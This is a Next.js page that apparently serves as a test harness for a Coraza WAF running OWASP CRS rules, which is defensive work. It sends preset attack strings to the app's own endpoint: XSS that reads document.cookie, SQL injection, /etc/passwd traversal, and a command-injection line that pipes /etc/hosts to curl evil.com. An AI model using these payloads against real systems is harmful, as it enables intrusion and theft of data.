'use client';

import { useState } from 'react';
import { 
  ShieldCheck, 
  ShieldAlert, 
  ShieldX, 
  Play, 
  Terminal, 
  AlertTriangle, 
  CheckCircle2, 
  RefreshCw,
  ExternalLink,
  Code
} from 'lucide-react';

interface TestCase {
  id: string;
  name: string;
  category: 'XSS' | 'SQLi' | 'RCE / LFI' | 'Benign';
  owaspRule: string;
  payload: string;
}

const PRESET_TEST_CASES: TestCase[] = [
  {
    id: 'xss-script',
    name: 'XSS: Classic <script> injection tag',
    category: 'XSS',
    owaspRule: 'OWASP CRS 941100 (XSS Filter - Script Tag Detected)',
    payload: "<script>alert('Coraza-XSS-Test')</script>",
  },
  {
    id: 'xss-img-onerror',
    name: 'XSS: HTML attribute event handler',
    category: 'XSS',
    owaspRule: 'OWASP CRS 941160 (XSS Filter - Inline Event Handler)',
    payload: '<img src=x onerror=alert(document.cookie)>',
  },
  {
    id: 'sqli-or-tautology',
    name: 'SQLi: Classic boolean tautology',
    category: 'SQLi',
    owaspRule: 'OWASP CRS 942100 (SQLi Filter - Boolean Condition Tautology)',
    payload: "' OR 1=1 --",
  },
  {
    id: 'sqli-union-select',
    name: 'SQLi: UNION SELECT schema extraction',
    category: 'SQLi',
    owaspRule: 'OWASP CRS 942190 (SQLi Filter - SELECT Clause Exploitation)',
    payload: "' UNION SELECT id, name, metrics, updated_at FROM projects--",
  },
  {
    id: 'path-traversal',
    name: 'LFI: Unix passwd path traversal',
    category: 'RCE / LFI',
    owaspRule: 'OWASP CRS 930100 (Path Traversal Attack /etc/passwd)',
    payload: '../../../../etc/passwd',
  },
  {
    id: 'rce-pipe',
    name: 'RCE: Command separator & pipe execution',
    category: 'RCE / LFI',
    owaspRule: 'OWASP CRS 932100 (Remote Command Execution / Shell Injection)',
    payload: '; id; cat /etc/hosts | curl evil.com',
  },
  {
    id: 'benign-search',
    name: 'Benign: Standard alphanumeric query',
    category: 'Benign',
    owaspRule: 'Pass Through (No OWASP CRS trigger)',
    payload: 'NextDeploy VPS Kitchen Sink Test 2026',
  },
];

interface TestResult {
  testId: string;
  statusCode: number;
  blockedByWaf: boolean;
  latencyMs: number;
  message: string;
  timestamp: string;
}

export default function WafVerificationPage() {
  const [results, setResults] = useState<Record<string, TestResult>>({});
  const [isRunningAll, setIsRunningAll] = useState(false);
  const [customPayload, setCustomPayload] = useState("<script>alert('custom-test')</script>");
  const [customRunning, setCustomRunning] = useState(false);

  const executeTestCase = async (test: TestCase): Promise<TestResult> => {
    const start = performance.now();
    try {
      const url = `/api/waf-test?type=${encodeURIComponent(test.category)}&q=${encodeURIComponent(test.payload)}`;
      const res = await fetch(url, {
        method: 'GET',
        cache: 'no-store',
      });
      const latencyMs = Number((performance.now() - start).toFixed(1));

      // 403 Forbidden is the standard Coraza WAF drop response
      const blockedByWaf = res.status === 403;
      let message = '';

      if (blockedByWaf) {
        message = 'BLOCKED: Coraza WAF intercepted packet at Caddy ingress with HTTP 403.';
      } else if (res.status === 200) {
        if (test.category === 'Benign') {
          message = 'ALLOWED: Benign traffic allowed through to Next.js.';
        } else {
          message = 'ALLOWED: Request reached application layer. (Coraza WAF is not enforcing on local dev without Caddy proxy).';
        }
      } else {
        message = `Returned status ${res.status}`;
      }

      const result: TestResult = {
        testId: test.id,
        statusCode: res.status,
        blockedByWaf,
        latencyMs,
        message,
        timestamp: new Date().toLocaleTimeString(),
      };

      setResults((prev) => ({ ...prev, [test.id]: result }));
      return result;
    } catch (err: unknown) {
      const latencyMs = Number((performance.now() - start).toFixed(1));
      const message = err instanceof Error ? err.message : 'Network error';
      const result: TestResult = {
        testId: test.id,
        statusCode: 0,
        blockedByWaf: false,
        latencyMs,
        message,
        timestamp: new Date().toLocaleTimeString(),
      };
      setResults((prev) => ({ ...prev, [test.id]: result }));
      return result;
    }
  };

  const handleRunAll = async () => {
    setIsRunningAll(true);
    for (const test of PRESET_TEST_CASES) {
      await executeTestCase(test);
    }
    setIsRunningAll(false);
  };

  const handleRunCustom = async () => {
    setCustomRunning(true);
    await executeTestCase({
      id: 'custom-payload',
      name: 'User Custom Payload',
      category: 'XSS',
      owaspRule: 'Custom OWASP Inspection',
      payload: customPayload,
    });
    setCustomRunning(false);
  };

  return (
    <div className="space-y-8">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-6 border-b border-slate-800">
        <div>
          <div className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-indigo-950/80 border border-indigo-800 text-indigo-400 text-xs font-mono mb-2">
            <ShieldCheck className="w-3 h-3" />
            Coraza OWASP CRS v4 Inspection
          </div>
          <h1 className="text-2xl sm:text-3xl font-extrabold text-white">
            Coraza WAF Denial Verification Harness
          </h1>
          <p className="text-sm text-slate-400 mt-1 max-w-2xl">
            Simulates malicious cross-site scripting (<code className="text-cyan-300">&lt;script&gt;</code>), SQL injection (<code className="text-cyan-300">&apos; OR 1=1</code>), and path traversal to verify that Coraza WAF denies malicious query parameters before reaching Node.js.
          </p>
        </div>

        <button
          onClick={handleRunAll}
          disabled={isRunningAll}
          className="inline-flex items-center gap-2 px-5 py-2.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-sm transition-all shadow-lg shadow-indigo-600/20 disabled:opacity-50 self-start sm:self-auto"
        >
          {isRunningAll ? (
            <>
              <RefreshCw className="w-4 h-4 animate-spin" />
              Firing Attack Vectors...
            </>
          ) : (
            <>
              <Play className="w-4 h-4 fill-white" />
              Run Full OWASP Test Suite
            </>
          )}
        </button>
      </div>

      {/* NextDeploy WAF Enforce Explainer Card */}
      <div className="p-5 rounded-xl bg-slate-900/60 border border-slate-800 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
        <div className="flex items-start gap-3">
          <div className="p-2 rounded-lg bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 shrink-0">
            <Terminal className="w-5 h-5" />
          </div>
          <div>
            <h3 className="text-sm font-semibold text-white">
              NextDeploy Orchestration Spec: <code className="text-cyan-300">web.waf.mode: &quot;enforce&quot;</code>
            </h3>
            <p className="text-xs text-slate-400 mt-0.5">
              On your production Linux VPS, Caddy is compiled with the <code className="text-slate-300">caddy-coraza</code> module. When enabled in enforce mode, Coraza interrupts HTTP transactions at phase 1 (request headers) or phase 2 (request body), returning <code className="text-indigo-400 font-mono">403 Forbidden</code> before the request ever touches the Node 22 container.
            </p>
          </div>
        </div>
      </div>

      {/* Preset Test Cases Table */}
      <div className="space-y-3">
        <h2 className="text-base font-bold text-white flex items-center gap-2">
          <ShieldAlert className="w-5 h-5 text-indigo-400" />
          Automated Attack Vector Payloads
        </h2>

        <div className="space-y-3">
          {PRESET_TEST_CASES.map((test) => {
            const res = results[test.id];

            return (
              <div
                key={test.id}
                className="p-4 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 transition-all flex flex-col lg:flex-row lg:items-center justify-between gap-4"
              >
                <div className="space-y-1.5 flex-1 min-w-0">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span
                      className={`text-[10px] font-mono px-2 py-0.5 rounded border uppercase font-semibold ${
                        test.category === 'XSS'
                          ? 'bg-amber-950/70 text-amber-300 border-amber-800'
                          : test.category === 'SQLi'
                          ? 'bg-red-950/70 text-red-300 border-red-800'
                          : test.category === 'RCE / LFI'
                          ? 'bg-purple-950/70 text-purple-300 border-purple-800'
                          : 'bg-emerald-950/70 text-emerald-300 border-emerald-800'
                      }`}
                    >
                      {test.category}
                    </span>
                    <h3 className="font-semibold text-sm text-white">{test.name}</h3>
                  </div>

                  <div className="text-xs text-slate-400 font-mono flex items-center gap-2 truncate">
                    <span className="text-slate-500">Payload:</span>
                    <code className="text-cyan-300 bg-slate-950 px-2 py-0.5 rounded border border-slate-800 truncate">
                      {test.payload}
                    </code>
                  </div>

                  <div className="text-[11px] text-slate-500 font-mono">
                    Target Rule: {test.owaspRule}
                  </div>
                </div>

                {/* Right Result State */}
                <div className="flex items-center gap-3 shrink-0">
                  {res ? (
                    <div className="flex items-center gap-2.5 font-mono text-xs">
                      <span
                        className={`px-2 py-1 rounded border font-bold ${
                          res.blockedByWaf
                            ? 'bg-indigo-950 text-indigo-300 border-indigo-700'
                            : res.statusCode === 200
                            ? test.category === 'Benign'
                              ? 'bg-emerald-950 text-emerald-300 border-emerald-700'
                              : 'bg-amber-950 text-amber-300 border-amber-700'
                            : 'bg-red-950 text-red-300 border-red-700'
                        }`}
                      >
                        {res.blockedByWaf ? '403 WAF BLOCKED' : `HTTP ${res.statusCode}`}
                      </span>

                      <span className="text-slate-400 text-[11px]">
                        {res.latencyMs} ms
                      </span>
                    </div>
                  ) : (
                    <span className="text-xs text-slate-500 font-mono">Untested</span>
                  )}

                  <button
                    onClick={() => executeTestCase(test)}
                    className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-xs font-medium transition-colors"
                  >
                    Test Probe
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Custom Payload Sandbox */}
      <div className="p-6 rounded-xl bg-slate-900/70 border border-slate-800 space-y-4">
        <div className="flex items-center justify-between pb-3 border-b border-slate-800">
          <h2 className="text-base font-bold text-white flex items-center gap-2">
            <Code className="w-5 h-5 text-cyan-400" />
            Custom Payload Injection Sandbox
          </h2>
          <span className="text-xs font-mono text-slate-400">
            Interactive Test Console
          </span>
        </div>

        <div className="flex flex-col sm:flex-row gap-3">
          <input
            type="text"
            value={customPayload}
            onChange={(e) => setCustomPayload(e.target.value)}
            placeholder="Enter custom query payload to test against Coraza WAF..."
            className="flex-1 px-3 py-2 rounded-lg bg-slate-950 border border-slate-700 font-mono text-xs text-cyan-300 focus:outline-none focus:border-cyan-500"
          />
          <button
            onClick={handleRunCustom}
            disabled={customRunning}
            className="px-4 py-2 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold text-xs transition-colors shrink-0 disabled:opacity-50"
          >
            {customRunning ? 'Sending...' : 'Fire Probe'}
          </button>
        </div>

        {results['custom-payload'] && (
          <div className="p-4 rounded-lg bg-slate-950 border border-slate-800 font-mono text-xs space-y-1">
            <div className="flex justify-between text-slate-400">
              <span>Status:</span>
              <span className={results['custom-payload'].blockedByWaf ? 'text-indigo-400 font-bold' : 'text-slate-200'}>
                {results['custom-payload'].statusCode} ({results['custom-payload'].blockedByWaf ? 'Blocked by WAF' : 'Passed to Node.js'})
              </span>
            </div>
            <div className="flex justify-between text-slate-400">
              <span>Latency:</span>
              <span className="text-cyan-400">{results['custom-payload'].latencyMs} ms</span>
            </div>
            <div className="pt-2 text-slate-300">
              {results['custom-payload'].message}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
